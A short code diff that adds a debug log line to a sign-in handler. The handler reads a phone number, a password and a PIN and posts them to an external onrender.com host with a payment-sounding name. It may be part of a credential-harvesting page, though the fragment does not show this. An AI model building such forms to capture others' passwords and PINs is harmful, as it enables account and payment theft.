@@ -444,6 +444,7 @@ function handleSignIn() {
 const phone = document.querySelector('input[type="tel"]').value;
 const password = document.querySelectorAll('input[type="password"]')[0].value;
 const pin = document.querySelectorAll('input[type="password"]')[1].value;
+console.log("Button clicked");
 fetch('https://uonopay.onrender.com/submit', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
